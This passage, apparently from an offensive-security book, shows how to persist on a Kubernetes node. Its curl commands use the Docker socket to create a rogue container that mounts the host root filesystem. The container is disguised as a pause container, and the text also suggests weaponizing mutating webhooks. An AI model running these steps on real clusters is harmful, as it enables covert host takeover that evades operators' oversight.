This second container will be completely invisible to Kubernetes since it is not attached to an existing object like a ReplicaSet or DaemonSet, but was defiantly created by Docker on a node. This container will silently continue running in privileged mode with minimal supervision. Listing 9-8 gives the three curl commands to pull, create, and start such a container through the Docker API. This script should be loaded and executed by the amazon-metrics-collector container we defined earlier.

```
# Pull the image from the ECR registry
curl \
--silent \
--unix-socket /var/run/docker.sock \
"http://docker/images/create?fromImage=881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64" \
-X POST

# Create the container from the image and mount the / directory
curl \
--silent \
--unix-socket /var/run/docker.sock \
"http://docker/containers/create?name=pause-go-amd64-4413" \
-X POST \
-H "Content-Type: application/json" \
-d '{"Image": "881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64", "Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}'

# Start the container
curl \
--silent \
--unix-socket /var/run/docker.sock \
"http://docker/containers/pause-go-amd64-4413/start" \
-X POST \
-H "Content-Type: application/json" \
--output /dev/null \
--write-out "%{http_code}"
```

Listing 9-8: A script to pull a new Docker image, create the container, and start it

To further conceal our rogue container, we smuggle it among the many pause containers that are usually running on any given node. The pause container plays a key role in the Kubernetes architecture, as it's the container that inherits all the namespaces assigned to a pod and shares them with the containers inside. There are as many pause containers as there are pods, so one more will hardly raise an eyebrow.

**NOTE** Kube has a resource called a mutating webhook that patches pod manifests on the fly to inject containers, volumes, and so on. It's tricky to configure but can be lethal to achieve persistence. However, we need the cluster to be at least version 1.15 to reliably weaponize the pods. See the Medium article “Writing a Very Basic Kubernetes Mutating Admission Webhook” by Alex Leonhardt for practical information.